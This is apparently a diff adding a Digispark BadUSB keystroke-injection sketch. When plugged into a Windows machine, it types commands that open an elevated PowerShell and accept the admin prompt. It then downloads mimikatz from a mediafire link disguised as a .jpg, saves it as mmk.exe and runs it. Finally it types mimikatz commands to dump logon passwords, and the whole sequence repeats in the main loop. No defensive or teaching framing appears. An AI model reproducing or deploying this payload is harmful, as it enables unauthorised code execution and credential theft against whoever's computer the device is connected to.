@@ -1,0 +1,39 @@
+#include "DigiKeyboard.h"
+#define KEY_LEFT_ARROW   0x50
+void loop() {
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(250);
+  DigiKeyboard.println("powershell Start-Process powershell -Verb runAs");
+  DigiKeyboard.delay(3000);
+  //DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
+  DigiKeyboard.sendKeyStroke(KEY_LEFT_ARROW);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(5000);
+  
+  DigiKeyboard.println("$down = New-Object System.Net.WebClient;");
+  DigiKeyboard.delay(300);
+  DigiKeyboard.println("$url = 'http://download1478.mediafire.com/3yz2saahmzng/ta6dshd1l1van8k/mimikatz.jpg';");
+  DigiKeyboard.delay(250);
+  DigiKeyboard.println("$file = 'mmk.exe'; $down.DownloadFile($url,$file);");
+  DigiKeyboard.delay(15000);
+  DigiKeyboard.println("$exec = New-Object -com shell.application;");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.println("$exec.shellexecute($file); exit;");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.println("MOD_GUI_LEFT,MOD_ALT_LEFT");
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.println("privilege::debug");
+  DigiKeyboard.delay(300);
+  DigiKeyboard.println("sekurlsa::logonPasswords full");
+  DigiKeyboard.delay(30000);
+
+}
+
+void setup() {
+ 
+}
